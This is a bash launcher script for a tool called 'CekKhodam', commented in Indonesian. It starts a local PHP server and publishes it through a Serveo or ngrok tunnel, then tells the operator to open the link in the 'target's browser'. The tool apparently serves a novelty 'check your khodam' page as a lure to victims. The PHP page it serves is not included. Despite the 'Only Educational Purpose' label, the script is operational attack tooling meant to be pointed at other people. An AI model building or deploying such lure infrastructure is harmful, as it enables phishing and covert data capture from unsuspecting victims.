#!/bin/bash
# CekKhodam v1.0
# Only Educational Purpose

trap 'echo; stop' 2

stop() {
    echo "[*] Membersihkan proses..."
    pkill -f php >/dev/null 2>&1
    pkill -f ssh >/dev/null 2>&1
    pkill -f ngrok >/dev/null 2>&1
    exit 1
}

dependencies() {
    command -v php >/dev/null 2>&1 || { echo "PHP belum terinstall!"; exit 1; }
}

start_php() {
    fuser -k 3333/tcp >/dev/null 2>&1
    php -S localhost:3333 >/dev/null 2>&1 &
    sleep 2
}

start_serveo() {
    echo "[*] Memulai Serveo..."
    if [[ -f sendlink ]]; then rm sendlink; fi
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2>/dev/null > sendlink &
    sleep 5
    link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    echo "[+] Serveo link: $link"
}

start_ngrok() {
    command -v ngrok >/dev/null 2>&1 || { echo "Ngrok belum terinstall!"; exit 1; }
    echo "[*] Memulai Ngrok..."
    ./ngrok http 3333 >/dev/null 2>&1 &
    sleep 5
    link=$(curl --silent --max-time 5 http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"[^"]*' | cut -d'"' -f4)
    echo "[+] Ngrok link: $link"
}

banner() {
    clear
    echo -e "\e[1;92m Cek Khodam - Only Educational Purpose \e[0m"
}

# Pilih tunnel
select_tunnel() {
    echo "----- Pilih Tunnel -----"
    echo "[1] Serveo.net"
    echo "[2] Ngrok"
    read -p "[Default 1] Pilih: " option
    option="${option:-1}"
}

# Main
banner
dependencies
start_php
select_tunnel

if [[ $option -eq 1 ]]; then
    start_serveo
elif [[ $option -eq 2 ]]; then
    start_ngrok
else
    echo "[!] Pilihan tidak valid. Menggunakan Serveo default."
    start_serveo
fi

echo "[*] Server berjalan. Buka link di browser target untuk mulai."
